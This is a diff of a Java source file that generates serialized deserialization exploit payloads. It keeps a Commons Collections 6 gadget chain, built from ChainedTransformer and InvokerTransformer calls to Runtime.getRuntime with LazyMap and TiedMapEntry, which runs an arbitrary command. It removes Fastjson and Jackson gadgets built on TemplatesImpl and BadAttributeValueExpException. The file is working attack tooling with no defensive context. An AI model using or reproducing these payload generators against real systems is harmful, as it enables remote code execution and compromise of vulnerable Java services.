@@ -1,8 +1,5 @@
-package org.util;
+package org.gadget;
 
-import com.alibaba.fastjson.JSONArray;
-import com.fasterxml.jackson.databind.node.POJONode;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -10,7 +7,6 @@ import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
-import javax.management.BadAttributeValueExpException;
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
@@ -18,25 +14,8 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 
-public class Gadget {
-    public static byte[] fastjson49_83(String common) throws Exception {
-        TemplatesImpl template = TemplateUtils.getTemplate(common);
-        JSONArray jsonArray = new JSONArray();
-        jsonArray.add(template);
-
-        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
-        Field field = bd.getClass().getDeclaredField("val");
-        field.setAccessible(true);
-        field.set(bd, jsonArray);
-
-        HashMap hashMap = new HashMap();
-        hashMap.put(template,bd);
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-        new ObjectOutputStream(byteArrayOutputStream).writeObject(hashMap);
-        return byteArrayOutputStream.toByteArray();
-    }
-
-    public static byte[] cc6(String common) throws Exception {
+public class CC6 {
+    public static byte[] getBytes(String common) throws Exception {
         ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
@@ -70,20 +49,6 @@ public class Gadget {
 
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         new ObjectOutputStream(byteArrayOutputStream).writeObject(map);
-        return byteArrayOutputStream.toByteArray();
-    }
-
-    public static byte[] jackson(String common) throws Exception {
-        TemplatesImpl template = TemplateUtils.getTemplate(common);
-        POJONode node = new POJONode(template);
-        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
-        //反射设置val属性
-        Field val1 = val.getClass().getDeclaredField("val");
-        val1.setAccessible(true);
-        val1.set(val,node);
-
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-        new ObjectOutputStream(byteArrayOutputStream).writeObject(val);
         return byteArrayOutputStream.toByteArray();
     }
 }
